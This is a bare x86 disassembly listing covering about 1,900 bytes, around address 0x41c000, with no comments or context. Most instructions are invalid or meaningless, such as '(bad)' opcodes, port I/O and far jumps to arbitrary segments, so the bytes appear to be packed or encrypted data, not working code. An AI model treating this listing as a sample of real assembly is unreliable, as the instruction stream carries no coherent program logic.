  41c072:	sub    esp,DWORD PTR [eax-0x64]
  41c075:	push   edx
  41c076:	addr16 push esi
  41c078:	mov    al,ds:0x53540507
  41c07d:	pop    ss
  41c07e:	sbb    ebx,ebx
  41c080:	imul   ebx,DWORD PTR [edi],0xf505bbc2
  41c086:	xchg   DWORD PTR [eax],ebx
  41c088:	je     0x41c0c0
  41c08a:	mov    ch,0x58
  41c08c:	push   edi
  41c08d:	test   DWORD PTR [edi+esi*4-0x50],edx
  41c091:	aad    0x25
  41c093:	test   DWORD PTR [edi+0x1],eax
  41c096:	scas   eax,DWORD PTR es:[edi]
  41c097:	inc    ecx
  41c098:	dec    eax
  41c099:	(bad)  
  41c09a:	(bad)  
  41c09c:	dec    ebx
  41c09d:	sub    BYTE PTR [esi+edi*2],ch
  41c0a0:	cmp    BYTE PTR [esi+0x4d334422],dh
  41c0a6:	cvtdq2ps xmm1,xmm5
  41c0a9:	cs dec edx
  41c0ab:	push   ss
  41c0ac:	pop    es
  41c0ad:	and    bh,BYTE PTR [ecx+esi*2-0x6]
  41c0b1:	cmp    edx,DWORD PTR [esi+0x7e]
  41c0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0b5:	mov    ebx,0xa8d41b24
  41c0ba:	dec    esi
  41c0bb:	das    
  41c0bc:	ins    BYTE PTR es:[edi],dx
  41c0bd:	cvtps2pd xmm7,xmm6
  41c0c0:	out    dx,al
  41c0c1:	in     eax,0x9d
  41c0c3:	pop    es
  41c0c4:	dec    ebp
  41c0c5:	lods   al,BYTE PTR ds:[esi]
  41c0c6:	dec    ebx
  41c0c7:	mov    dl,0x8b
  41c0c9:	sub    eax,0x64891284
  41c0ce:	jp     0x41c0e9
  41c0d0:	sbb    BYTE PTR [ebx+0x7015c06e],0x91
  41c0d7:	(bad)  
  41c0d8:	pop    eax
  41c0d9:	dec    ecx
  41c0da:	dec    ebx
  41c0db:	dec    edi
  41c0dc:	adc    cl,dh
  41c0de:	or     BYTE PTR [ebx-0x500cc131],ch
  41c0e4:	push   eax
  41c0e5:	jno    0x41c115
  41c0e7:	in     eax,dx
  41c0e8:	int    0xb
  41c0ea:	es pop ecx
  41c0ec:	push   ecx
  41c0ed:	std    
  41c0ee:	mov    ebp,0xc46073d8
  41c0f3:	sub    DWORD PTR [esi+edi*8+0x39],ebx
  41c0f7:	lods   eax,DWORD PTR ds:[esi]
  41c0f8:	xor    ebx,0x20
  41c0fb:	test   BYTE PTR [ebx],dl
  41c0fd:	loope  0x41c12e
  41c0ff:	push   ebp
  41c100:	push   esi
  41c101:	or     eax,0x8f538416
  41c106:	in     eax,dx
  41c107:	mov    edx,0xd42ee269
  41c10d:	(bad)  
  41c10e:	aam    0x28
  41c110:	nop
  41c111:	bound  edi,QWORD PTR [ecx-0x6db8e3bd]
  41c117:	ja     0x41c0e7
  41c119:	xchg   esi,eax
  41c11a:	cs xchg esp,eax
  41c11c:	fdivp  st(0),st
  41c11e:	inc    edx
  41c11f:	cmp    DWORD PTR [edx],0x4e
  41c122:	cdq    
  41c123:	xor    eax,DWORD PTR [edi]
  41c125:	adc    BYTE PTR [ecx-0x265bb7fe],bl
  41c12b:	out    dx,eax
  41c12c:	ins    BYTE PTR es:[edi],dx
  41c12d:	out    0x67,al
  41c12f:	jbe    0x41c16a
  41c131:	leave  
  41c132:	and    ah,BYTE PTR [esi+0x55]
  41c135:	ins    BYTE PTR es:[edi],dx
  41c136:	loop   0x41c0e8
  41c138:	dec    ebx
  41c139:	arpl   WORD PTR ds:0x362eb7d7,ax
  41c13f:	push   edi
  41c140:	push   0xd92f6602
  41c145:	data16 cmp ah,dh
  41c148:	or     DWORD PTR [esi+0x25],edx
  41c14b:	cmp    ebx,DWORD PTR [edx+0xafc834d]
  41c151:	or     cl,ch
  41c153:	jmp    0x5cac:0x6d6a32cb
  41c15a:	out    dx,al
  41c15b:	vpsubb xmm2,xmm7,XMMWORD PTR [edi-0x50]
  41c160:	mov    BYTE PTR [edi+0x4b],bh
  41c163:	xchg   dh,cl
  41c165:	clc    
  41c166:	push   0x48fef075
  41c16b:	test   al,0xb
  41c16d:	fcom   DWORD PTR [ebx-0x4983cc2b]
  41c173:	pusha  
  41c174:	or     esi,DWORD PTR [edi]
  41c176:	mov    bh,0x3
  41c178:	ficomp WORD PTR [ecx+ebp*8-0x3fa8aedb]
  41c17f:	mov    edi,0xe7dc5ac8
  41c184:	sub    al,0xcf
  41c186:	pop    esp
  41c187:	mov    dl,0xb1
  41c189:	pop    ds
  41c18a:	sub    bh,0x6d
  41c18d:	nop
  41c18e:	add    ebp,ebx
  41c190:	sub    esi,esp
  41c192:	js     0x41c164
  41c194:	aam    0x82
  41c196:	outs   dx,DWORD PTR ds:[esi]
  41c197:	mov    bh,bh
  41c199:	iret   
  41c19a:	ins    DWORD PTR es:[edi],dx
  41c19b:	add    BYTE PTR [ebp-0x21],ch
  41c19e:	in     eax,0xac
  41c1a0:	add    esp,DWORD PTR [edi-0x71]
  41c1a3:	sbb    ebx,ecx
  41c1a5:	int    0x8e
  41c1a7:	test   DWORD PTR [eax+ebx*2-0x70],edx
  41c1ab:	and    esp,0x58452f35
  41c1b1:	and    eax,0xab00d08f
  41c1b6:	je     0x41c1df
  41c1b8:	dec    esp
  41c1b9:	lock test al,0x37
  41c1bc:	pop    ebp
  41c1bd:	push   ecx
  41c1be:	dec    edi
  41c1bf:	or     BYTE PTR [edx+0x46],ah
  41c1c2:	call   0x9f5f:0xdcee51a9
  41c1c9:	iret   
  41c1ca:	push   0x80f93648
  41c1cf:	push   ebp
  41c1d0:	xchg   esp,eax
  41c1d1:	sub    DWORD PTR es:0x5639604a,ebx
  41c1d8:	pop    ecx
  41c1d9:	fnstsw WORD PTR [esi-0x79f7f92]
  41c1df:	jg     0x41c1ff
  41c1e1:	adc    ah,dh
  41c1e3:	sub    esp,esi
  41c1e5:	and    DWORD PTR [esi*8-0x403daa97],edi
  41c1ec:	mov    ch,0x6b
  41c1ee:	or     edi,edx
  41c1f0:	inc    esp
  41c1f1:	xchg   ebp,eax
  41c1f2:	ja     0x41c1c8
  41c1f4:	push   ebx
  41c1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f6:	(bad)  
  41c1f8:	arpl   WORD PTR [eax-0x171295ae],ax
  41c1fe:	mov    edi,0x2c3f4eef
  41c203:	pop    ds
  41c204:	test   DWORD PTR [ecx+edi*8+0x517bf986],ebx
  41c20b:	pop    ds
  41c20c:	jmp    0xaeebdb95
  41c211:	clc    
  41c212:	scas   eax,DWORD PTR es:[edi]
  41c213:	push   ebp
  41c214:	sub    BYTE PTR [ebp+0x4e],ah
  41c217:	in     eax,dx
  41c218:	push   esp
  41c219:	dec    ecx
  41c21a:	(bad)  
  41c21b:	(bad)  
  41c21c:	add    ch,BYTE PTR [eax-0x7e61331f]
  41c222:	(bad)  
  41c223:	idiv   BYTE PTR [edx]
  41c225:	or     eax,0x40ceeb1d
  41c22a:	mov    edi,0xad61409a
  41c22f:	push   ss
  41c230:	pop    ebx
  41c231:	shr    BYTE PTR [eax],cl
  41c233:	fs xchg bl,bh
  41c236:	out    0xd5,al
  41c238:	(bad)  
  41c239:	push   ds
  41c23a:	xchg   ecx,eax
  41c23b:	xor    BYTE PTR [esi+edi*1-0x63835bc3],bl
  41c242:	aad    0x5e
  41c244:	mov    ds:0xb8e18a69,al
  41c249:	and    BYTE PTR [edi-0x77],bh
  41c24c:	cwde   
  41c24d:	xor    eax,0x79d995be
  41c252:	fucomip st,st(5)
  41c254:	jnp    0x41c257
  41c256:	nop
  41c257:	dec    edx
  41c258:	sbb    esi,ebx
  41c25a:	test   al,0xf8
  41c25c:	or     eax,0x2982715a
  41c261:	cs inc ebx
  41c263:	mov    edx,0xec7bf4b8
  41c268:	or     DWORD PTR [edi-0x3c],ebp
  41c26b:	daa    
  41c26c:	(bad)  
  41c26d:	pop    edx
  41c26e:	xchg   ebp,eax
  41c26f:	repnz mov eax,ds:0x804af159
  41c275:	popa   
  41c276:	lock mov ebp,0x37ed4f71
  41c27c:	ror    BYTE PTR [eax],0x7
  41c27f:	push   eax
  41c280:	aas    
  41c281:	pop    ss
  41c282:	dec    ecx
  41c283:	pop    ds
  41c284:	fxch   st(6)
  41c286:	dec    ebx
  41c287:	mov    bh,0xa0
  41c289:	cld    
  41c28a:	pop    ds
  41c28b:	daa    
  41c28c:	je     0x41c2d9
  41c28e:	(bad)  
  41c28f:	in     eax,dx
  41c290:	in     al,0xcc
  41c292:	in     al,dx
  41c293:	into   
  41c294:	xor    al,0x3
  41c296:	push   ebp
  41c297:	aam    0xf8
  41c299:	test   DWORD PTR [ebx],ebx
  41c29b:	dec    ebp
  41c29c:	arpl   WORD PTR [ebx+0x3],di
  41c29f:	sti    
  41c2a0:	add    bl,BYTE PTR [esi+ebp*2]
  41c2a3:	push   edx
  41c2a4:	pop    ebp
  41c2a5:	mov    edx,0xb55f0516
  41c2aa:	xchg   edi,eax
  41c2ab:	sbb    DWORD PTR [ebp-0x2e3b2c1d],esp
  41c2b1:	pop    ebx
  41c2b2:	jmp    0x9dd0:0x3d375b1c
  41c2b9:	pop    es
  41c2ba:	pop    ebp
  41c2bb:	push   ecx
  41c2bc:	xchg   esp,eax
  41c2bd:	ret    0xa282
  41c2c0:	loop   0x41c2ae
  41c2c2:	cs jb  0x41c316
  41c2c5:	jae    0x41c298
  41c2c7:	test   DWORD PTR [ecx-0x63],ebp
  41c2ca:	or     bh,ah
  41c2cc:	adc    al,0x19
  41c2ce:	fs jecxz 0x41c281
  41c2d1:	and    ah,BYTE PTR [edi-0x69]
  41c2d4:	cs push ebp
  41c2d6:	cmp    DWORD PTR [eax-0x8],0x64
  41c2da:	mov    ebp,DWORD PTR [esi-0x1d]
  41c2dd:	imul   eax,DWORD PTR [eax-0x66],0x495c9614
  41c2e4:	retf   
  41c2e5:	test   al,0xaa
  41c2e7:	adc    edx,DWORD PTR ds:0xcb2f9c51
  41c2ed:	pop    es
  41c2ee:	cs mov ch,0x3b
  41c2f1:	mov    dl,0xd6
  41c2f3:	sbb    al,dh
  41c2f5:	ret    
  41c2f6:	and    ebp,DWORD PTR [ebp-0x2e]
  41c2f9:	out    0xac,al
  41c2fb:	cmc    
  41c2fc:	sbb    BYTE PTR [ebp+eiz*8+0x46],ah
  41c300:	jnp    0x41c36d
  41c302:	sub    ebx,ecx
  41c304:	ret    
  41c305:	dec    ebx
  41c306:	fistp  QWORD PTR [ecx-0x243b36ac]
  41c30c:	test   eax,0x93fc748d
  41c311:	sub    al,0xab
  41c313:	out    dx,al
  41c314:	sub    DWORD PTR [ebx+eax*8+0x25cb6451],esi
  41c31b:	or     DWORD PTR [edx-0x15],ecx
  41c31e:	jbe    0x41c30a
  41c320:	mov    ch,0xd9
  41c322:	scas   al,BYTE PTR es:[edi]
  41c323:	imul   eax,DWORD PTR [edx+0x19],0xffffffc0
  41c327:	add    ah,BYTE PTR [eax-0x5d]
  41c32a:	jp     0x41c2b3
  41c32c:	mov    esi,0x7d395b2f
  41c331:	mov    DWORD PTR fs:[edi],eax
  41c334:	xor    edi,ebp
  41c336:	or     bl,BYTE PTR [ebp+0x312c3cda]
  41c33c:	adc    BYTE PTR [ebx+ebx*2],ch
  41c33f:	or     eax,0xb2419a93
  41c344:	or     DWORD PTR [ebx-0x3a1d1d21],ecx
  41c34a:	es sbb al,0x9c
  41c34d:	(bad)  
  41c34e:	in     eax,0xf1
  41c350:	(bad)
  41c354:	and    edx,DWORD PTR [edx+0x4fd8c8ea]
  41c35a:	not    esp
  41c35c:	sub    ebp,edi
  41c35e:	sub    dl,BYTE PTR [esi+0xa]
  41c361:	fdiv   DWORD PTR [edi-0x65]
  41c364:	fadd   DWORD PTR [ebx+0x5cd2e590]
  41c36a:	out    0x8d,al
  41c36c:	adc    al,0xce
  41c36e:	loope  0x41c312
  41c370:	xor    BYTE PTR [esi],al
  41c372:	cmp    ecx,ecx
  41c374:	icebp  
  41c375:	(bad)  
  41c376:	mul    DWORD PTR [esi+0x13c080c1]
  41c37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c37d:	das    
  41c37e:	int3   
  41c37f:	fist   DWORD PTR [ecx]
  41c381:	aad    0x5
  41c383:	xchg   ebx,eax
  41c384:	and    edi,edi
  41c386:	lods   eax,DWORD PTR ds:[esi]
  41c387:	xor    BYTE PTR [esp+ecx*2+0x1a],bh
  41c38b:	cmp    DWORD PTR [edi+0x90bf681],eax
  41c391:	push   ecx
  41c392:	dec    ecx
  41c393:	mov    al,0x3e
  41c395:	ret    0xb24b
  41c398:	or     al,0xf7
  41c39a:	jmp    0xbb35:0x3a15ea1c
  41c3a1:	dec    eax
  41c3a2:	pop    esi
  41c3a3:	adc    BYTE PTR [eax],0x5
  41c3a6:	and    DWORD PTR [eax+0x2dd10700],0x7b
  41c3ad:	dec    ecx
  41c3ae:	pusha  
  41c3af:	ret    0xce18
  41c3b2:	push   esp
  41c3b3:	pop    edx
  41c3b4:	or     cl,BYTE PTR [ebp+0x452a626]
  41c3ba:	cdq    
  41c3bb:	ds xor esi,0xffffffac
  41c3bf:	cmp    DWORD PTR [esi],edx
  41c3c1:	lods   eax,DWORD PTR ds:[esi]
  41c3c2:	push   ebp
  41c3c3:	(bad)  
  41c3c4:	ins    DWORD PTR es:[edi],dx
  41c3c5:	inc    eax
  41c3c6:	(bad)  
  41c3c7:	mov    ecx,0x1d0e12f1
  41c3cc:	cmp    al,0xd
  41c3ce:	(bad)  
  41c3cf:	cli    
  41c3d0:	lds    eax,FWORD PTR [eax+0x2e]
  41c3d3:	loope  0x41c364
  41c3d5:	pop    eax
  41c3d6:	fisttp DWORD PTR [esi]
  41c3d8:	aas    
  41c3d9:	mov    ds:0xbdf1e819,al
  41c3de:	fstp   TBYTE PTR [ecx+0x42]
  41c3e1:	jmp    0x41c3ad
  41c3e3:	jb     0x41c37b
  41c3e5:	leave  
  41c3e6:	in     eax,0xc5
  41c3e8:	pop    ds
  41c3e9:	(bad)  
  41c3ea:	push   eax
  41c3eb:	enter  0x5156,0x91
  41c3ef:	jmp    0x41c3cf
  41c3f1:	in     al,dx
  41c3f2:	ret    0x74c3
  41c3f5:	call   0x1a68d5be
  41c3fa:	retf   0xfbc
  41c3fd:	(bad)  
  41c3ff:	pop    eax
  41c400:	mov    ah,0x60
  41c402:	push   edx
  41c403:	in     al,dx
  41c404:	jg     0x41c3c5
  41c406:	sbb    DWORD PTR [esi+0x7a6a7452],edi
  41c40c:	push   0xffffffd9
  41c40e:	rcr    DWORD PTR [edi+0x205c5f1e],cl
  41c414:	rcl    DWORD PTR [esi],0x32
  41c417:	out    dx,al
  41c418:	xchg   edi,eax
  41c419:	and    al,0x31
  41c41b:	fst    QWORD PTR [eax-0x4035abeb]
  41c421:	rep outs dx,DWORD PTR ds:[esi]
  41c423:	inc    ecx
  41c424:	adc    al,0x3d
  41c426:	jo     0x41c3b4
  41c428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c429:	adc    eax,0xa0accbf0
  41c42e:	mov    cl,0xd0
  41c430:	daa    
  41c431:	sbb    ah,BYTE PTR [edi+eiz*2]
  41c434:	loope  0x41c452
  41c436:	mov    al,0xe0
  41c438:	aaa    
  41c439:	mul    BYTE PTR [esi-0x541332b]
  41c43f:	push   ss
  41c440:	add    ebx,ecx
  41c442:	mov    ds:0xd53be381,al
  41c447:	popa   
  41c448:	or     dl,BYTE PTR [ebx]
  41c44a:	addr16 mov dh,0x4d
  41c44d:	pop    esi
  41c44e:	add    dl,BYTE PTR [edx-0x50b521c0]
  41c454:	popa   
  41c455:	push   es
  41c456:	shl    DWORD PTR [ebx+0x13c08e6e],1
  41c45c:	jb     0x41c475
  41c45e:	mov    dl,0x99
  41c460:	push   es
  41c461:	jg     0x41c438
  41c463:	dec    esi
  41c464:	in     al,dx
  41c465:	dec    esp
  41c466:	or     esp,ebp
  41c468:	jmp    0xd11d597a
  41c46d:	or     edx,DWORD PTR [ebp+0xe]
  41c470:	inc    edx
  41c471:	and    al,0x81
  41c473:	hlt    
  41c474:	leave  
  41c475:	call   0xd132aa37
  41c47a:	fcmovnb st,st(3)
  41c47c:	xchg   ah,bl
  41c47e:	push   ecx
  41c47f:	(bad)  
  41c480:	sbb    edx,edi
  41c482:	pop    es
  41c483:	les    ecx,FWORD PTR ds:0xeef16694
  41c489:	cmp    eax,0x4a1d49cb
  41c48e:	and    BYTE PTR [eax+0x20],ah
  41c491:	fwait
  41c492:	xchg   BYTE PTR [edi-0x797d4292],dl
  41c498:	dec    ebx
  41c499:	mov    edx,0x99ea29d0
  41c49e:	popf   
  41c49f:	or     eax,0x93b38802
  41c4a4:	sub    bh,ch
  41c4a6:	retf   0xfd75
  41c4a9:	dec    ecx
  41c4aa:	loope  0x41c457
  41c4ac:	push   ss
  41c4ad:	pop    es
  41c4ae:	jl     0x41c4b7
  41c4b0:	push   0xffffffc2
  41c4b2:	stos   DWORD PTR es:[edi],eax
  41c4b3:	(bad)  [edx-0x71b881c2]
  41c4b9:	jmp    0x38754fa6
  41c4be:	or     al,0xc9
  41c4c0:	rcl    DWORD PTR [ecx+0x2220f33a],0xaf
  41c4c7:	daa    
  41c4c8:	sub    al,0x21
  41c4ca:	loopne 0x41c4e2
  41c4cc:	xchg   BYTE PTR [ecx+esi*2],bl
  41c4cf:	add    DWORD PTR [edx+0x19],ebp
  41c4d2:	mov    bh,0xce
  41c4d4:	push   cs
  41c4d5:	int3   
  41c4d6:	sbb    esi,edi
  41c4d8:	jp     0x41c4ac
  41c4da:	jmp    0x41c4eb
  41c4dc:	mov    edi,0xf31c45aa
  41c4e1:	das    
  41c4e2:	push   0xffffffb5
  41c4e4:	mov    bh,0xe0
  41c4e6:	adc    ch,BYTE PTR [esi+esi*4]
  41c4e9:	cmp    ah,BYTE PTR [ecx]
  41c4eb:	loop   0x41c49e
  41c4ed:	test   al,0x28
  41c4ef:	push   es
  41c4f0:	leave  
  41c4f1:	ffree  st(3)
  41c4f3:	mov    bh,BYTE PTR [ebx]
  41c4f5:	mov    al,ds:0xa826aaf6
  41c4fa:	leave  
  41c4fb:	ds fucomi st,st(3)
  41c4fe:	rol    esp,1
  41c500:	sub    ah,BYTE PTR ds:0xb2d97929
  41c506:	outs   dx,DWORD PTR ds:[esi]
  41c507:	(bad)  
  41c508:	lods   al,BYTE PTR ds:[esi]
  41c509:	jmp    0x41c526
  41c50b:	loop   0x41c499
  41c50d:	push   ds
  41c50e:	adc    DWORD PTR [ebp+0x24],0xffffff84
  41c512:	in     eax,0xc1
  41c514:	push   cs
  41c515:	pop    ss
  41c516:	cmp    eax,0x9d1f7b5c
  41c51b:	push   0x61
  41c51d:	inc    edx
  41c51e:	call   0x7818:0x910167e6
  41c525:	jp     0x41c50f
  41c527:	dec    edx
  41c528:	fist   DWORD PTR [eax+ebp*4+0x124ad7ba]
  41c52f:	(bad)  
  41c530:	mov    bh,0xea
  41c532:	arpl   WORD PTR [ebx-0x77],sp
  41c535:	cmp    si,cx
  41c538:	or     eax,0x48b4b110
  41c53d:	in     al,0x80
  41c53f:	not    BYTE PTR [ecx-0x46]
  41c542:	push   eax
  41c543:	xchg   ah,bl
  41c545:	push   esi
  41c546:	retf   0x342d
  41c549:	lea    ebp,[eax+0x3c6fdd1a]
  41c54f:	push   cs
  41c550:	into   
  41c551:	popf   
  41c552:	dec    edi
  41c553:	cs xchg ebx,eax
  41c555:	vunpcklpd ymm5,ymm7,ymm6
  41c559:	jg     0x41c4fc
  41c55b:	cmp    DWORD PTR [ecx],ebp
  41c55d:	mov    esi,0x93f35146
  41c562:	adc    edi,DWORD PTR [eax-0xd28172d]
  41c568:	and    BYTE PTR [esi+0x51fa8e26],dl
  41c56e:	lds    eax,FWORD PTR [edx]
  41c570:	in     al,dx
  41c571:	push   ecx
  41c572:	jmp    0x7dae5151
  41c577:	mov    al,ds:0x54f7867e
  41c57c:	lds    eax,FWORD PTR [ecx]
  41c57e:	stc    
  41c57f:	loopne 0x41c5f9
  41c581:	fcmovnb st,st(7)
  41c583:	scas   eax,DWORD PTR es:[edi]
  41c584:	xor    DWORD PTR [ecx],0x45
  41c587:	sbb    DWORD PTR [ebx],edx
  41c589:	retf   0x5cbe
  41c58c:	adc    BYTE PTR [edx+ebp*8+0x73],bh
  41c590:	mov    edi,0xef5aa8de
  41c595:	mov    bl,0x95
  41c597:	jo     0x41c5b0
  41c599:	aaa    
  41c59a:	adc    BYTE PTR [edi+0x7e5ec098],ah
  41c5a0:	jle    0x41c5e2
  41c5a2:	loope  0x41c545
  41c5a4:	xor    eax,0xa8769052
  41c5a9:	into   
  41c5aa:	mov    ds:0x36dc8a51,al
  41c5af:	adc    DWORD PTR [edx+0x4f724087],0xeb4da771
  41c5b9:	mov    eax,0x89afa4b
  41c5be:	jbe    0x41c599
  41c5c0:	sahf   
  41c5c1:	xor    al,0x80
  41c5c3:	and    DWORD PTR [esi],ebp
  41c5c5:	mov    dh,0xdf
  41c5c7:	xchg   ebp,eax
  41c5c8:	and    al,0xc7
  41c5ca:	retf   
  41c5cb:	mov    cs,ebp
  41c5cd:	rcr    BYTE PTR [esi],1
  41c5cf:	mov    ecx,0x4f2c8e4d
  41c5d4:	xchg   esp,eax
  41c5d5:	mov    bh,BYTE PTR [ebx+0x7de6b877]
  41c5db:	cmp    eax,0x92ac408b
  41c5e0:	mov    ebp,0xa48efb0a
  41c5e5:	popa   
  41c5e6:	push   0xc
  41c5e8:	add    BYTE PTR [esi-0x14b44152],bl
  41c5ee:	sbb    ecx,esp
  41c5f0:	and    eax,0x2cbeb412
  41c5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5f6:	push   0xffffffc7
  41c5f8:	xor    eax,0x5f2468cc
  41c5fd:	(bad)  
  41c600:	loopne 0x41c669
  41c602:	fs xor al,0x95
  41c605:	xchg   BYTE PTR [ebx-0x703864b9],cl
  41c60b:	add    bl,BYTE PTR [edi]
  41c60d:	shl    BYTE PTR [esi+eiz*8-0x5a],0xdb
  41c612:	cmc    
  41c613:	scas   al,BYTE PTR es:[edi]
  41c614:	fstp   DWORD PTR [eax]
  41c616:	lods   al,BYTE PTR ds:[esi]
  41c617:	jmp    0x1448:0x3083ca8
  41c61e:	inc    ecx
  41c61f:	push   ss
  41c620:	xor    al,0xfc
  41c622:	xchg   DWORD PTR [esi+0x7acb1ac],esi
  41c628:	out    dx,eax
  41c629:	rol    BYTE PTR [eax],1
  41c62b:	inc    eax
  41c62c:	int3   
  41c62d:	xchg   esi,eax
  41c62e:	sbb    DWORD PTR [eax+edi*1-0x1631d34a],0xffffff90
  41c636:	add    al,0x76
  41c638:	and    BYTE PTR [esi+0x59],dh
  41c63b:	nop
  41c63c:	idiv   DWORD PTR [ecx+0x15df64ee]
  41c642:	repz mov ebx,0xa26dd13c
  41c648:	adc    eax,0x7c7b1ecc
  41c64d:	mov    ebp,0xe2930def
  41c652:	call   0xa497a0d8
  41c657:	sub    eax,0xf53da79e
  41c65c:	fucomi st,st(3)
  41c65e:	push   ebp
  41c65f:	call   0xe2cf:0xd0815f58
  41c666:	into   
  41c667:	mov    ah,0xff
  41c669:	sbb    BYTE PTR [ebp+0x42],dh
  41c66c:	inc    esi
  41c66d:	mov    cs,WORD PTR [esi-0x482c5cdc]
  41c673:	jg     0x41c60c
  41c675:	enter  0x2ee0,0x50
  41c679:	pop    ecx
  41c67a:	test   al,0xc5
  41c67c:	aad    0xe1
  41c67e:	jo     0x41c612
  41c680:	call   0x35e:0x52c7c265
  41c687:	ds xchg edi,eax
  41c689:	mov    dl,0x50
  41c68b:	push   ss
  41c68c:	nop
  41c68d:	inc    edx
  41c68e:	pop    ebp
  41c68f:	fs mov ch,0x81
  41c692:	or     ebp,0xfffffff1
  41c695:	arpl   WORD PTR [esi-0xe1701f8],bp
  41c69b:	sub    eax,0x3dab1573
  41c6a0:	fiadd  DWORD PTR [edi]
  41c6a2:	sbb    esi,DWORD PTR [edi-0x23]
  41c6a5:	fimul  WORD PTR [esi+esi*2+0x2ca26395]
  41c6ac:	pop    es
  41c6ad:	in     eax,0x47
  41c6af:	or     DWORD PTR [ebp-0x4d],esi
  41c6b2:	js     0x41c689
  41c6b4:	jecxz  0x41c6c5
  41c6b6:	fmul   DWORD PTR [edi]
  41c6b8:	jmp    0x3a06d6bd
  41c6bd:	jg     0x41c6a4
  41c6bf:	jmp    0x41c72d
  41c6c1:	mov    ecx,0x7bf8844d
  41c6c6:	outs   dx,BYTE PTR ds:[esi]
  41c6c7:	mov    ah,0x4c
  41c6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6ca:	shl    BYTE PTR [ecx],1
  41c6cc:	add    ch,BYTE PTR [ebx-0x427f8e95]
  41c6d2:	push   edi
  41c6d3:	xor    ecx,DWORD PTR [edx-0x3d]
  41c6d6:	das    
  41c6d7:	and    al,0xdc
  41c6d9:	cwde   
  41c6da:	in     eax,0xd6
  41c6dc:	push   eax
  41c6dd:	mov    eax,ds:0x47ad4b43
  41c6e2:	mov    DWORD PTR [ebx-0x73ef082],esp
  41c6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e9:	xlat   BYTE PTR ds:[ebx]
  41c6ea:	rol    BYTE PTR [ebx-0x12],1
  41c6ed:	loope  0x41c72a
  41c6ef:	popf   
  41c6f0:	mov    eax,0xf2c1235d
  41c6f5:	mov    dh,BYTE PTR [eax]
  41c6f7:	push   edi
  41c6f8:	mov    ds,WORD PTR cs:[ebx+0x48]
  41c6fc:	popa   
  41c6fd:	dec    edx
  41c6fe:	out    0xdc,eax
  41c700:	xor    bh,BYTE PTR [edx]
  41c702:	jns    0x41c70b
  41c704:	xchg   BYTE PTR [esi+0x6ba283f3],bl
  41c70a:	dec    edx
  41c70b:	mov    eax,0xeba79c09
  41c710:	push   ebx
  41c711:	dec    edi
  41c712:	repz mov edx,0xe07eb29
  41c718:	cmp    BYTE PTR [edx+0xc],cl
  41c71b:	push   esp
  41c71c:	and    eax,0x9a5036a2
  41c721:	imul   ebx,DWORD PTR [ebp+eax*8-0xecda6a7],0xe77960a4
  41c72c:	mov    ds:0x8b2cc50d,eax
  41c731:	mov    ebx,0xd8a8fe3b
  41c736:	xchg   DWORD PTR [eax-0x5b96e58a],edx
  41c73c:	stc    
  41c73d:	lea    ebp,[eax-0x4b08ce6e]
  41c743:	pop    es
  41c744:	fdiv   st,st(7)
  41c746:	cmp    al,0xfb
  41c748:	rcr    DWORD PTR [ebp-0x302c385],1
  41c74e:	push   ebx
  41c74f:	inc    ecx
  41c750:	jmp    0x8bd2af66
  41c755:	sti    
  41c756:	xor    esi,eax
  41c758:	mov    esi,0xda0adc53
  41c75d:	ja     0x41c786
  41c75f:	push   esp
  41c760:	scas   al,BYTE PTR es:[edi]
  41c761:	sub    eax,0xa5c507f3
  41c766:	adc    BYTE PTR [edi],dh
  41c768:	ret    0xabac
  41c76b:	rcl    ebp,0x4f
  41c76e:	sbb    ch,BYTE PTR [edx-0x6a]
  41c771:	stos   BYTE PTR es:[edi],al
  41c772:	push   ecx
  41c773:	rcr    bh,cl
  41c775:	jmp    0xb254:0x2b0757ed
  41c77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c77e:	mov    ebp,0x3d98d8e
  41c783:	fcomp  QWORD PTR [ebx]
  41c785:	les    ebx,FWORD PTR [edi-0x3df4c131]
  41c78b:	adc    bl,BYTE PTR [ebx+0x14]
  41c78e:	adc    ebp,DWORD PTR [ecx+0x3d]
  41c791:	mov    gs,WORD PTR [ecx-0x61]
  41c794:	jnp    0x41c7b7
  41c796:	mov    ebx,0xa5066046
  41c79b:	jg     0x41c769
  41c79d:	sub    BYTE PTR [ecx],0x1b
  41c7a0:	in     eax,0x33
  41c7a2:	into   
  41c7a3:	jecxz  0x41c73f
  41c7a5:	inc    ecx
  41c7a6:	adc    DWORD PTR [ecx+ebp*1],ecx
  41c7a9:	mov    bh,0x0
  41c7ab:	in     al,dx
  41c7ac:	sbb    BYTE PTR [ebp-0xc303cd5],ch
  41c7b2:	in     al,0x96
  41c7b4:	jg     0x41c751
  41c7b6:	in     al,0x83
  41c7b8:	push   es
  41c7b9:	add    BYTE PTR [edx-0x28bb91cc],dl
  41c7bf:	sub    al,0x6a
  41c7c1:	xlat   BYTE PTR ds:[ebx]
  41c7c2:	sub    ch,BYTE PTR [eax-0x4e4332d8]
  41c7c8:	mov    dl,BYTE PTR [ecx+0x10]
  41c7cb:	jmp    0xd31e:0x890eb1e8
  41c7d2:	in     al,0xff
  41c7d4:	pop    esp
  41c7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7d6:	lea    eax,[ebp+0x56]
  41c7d9:	dec    ebx
  41c7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7db:	jmp    0x41c7a5
  41c7dd:	inc    edx
  41c7de:	mov    ds:0xc5e7fa29,al
  41c7e3:	lods   al,BYTE PTR ds:[esi]
  41c7e4:	jmp    0x41c7bb
  41c7e6:	xchg   ecx,eax
  41c7e7:	lock test al,0x26
  41c7ea:	mov    DWORD PTR ds:0x314406d7,esp
  41c7f0:	cmp    eax,0x87fce705
  41c7f5:	les    eax,FWORD PTR [esi+0x35]
  41c7f8:	pop    ecx
  41c7f9:	ins    DWORD PTR es:[edi],dx
  41c7fa:	sub    BYTE PTR [ecx+0x15],cl
  41c7fd:	(bad)  
  41c7ff:	cmp    BYTE PTR ds:0x79e2d9b8,ch
  41c805:	sahf   
  41c806:	fs or  eax,0xebb90946
  41c80c:	jmp    0x41c887
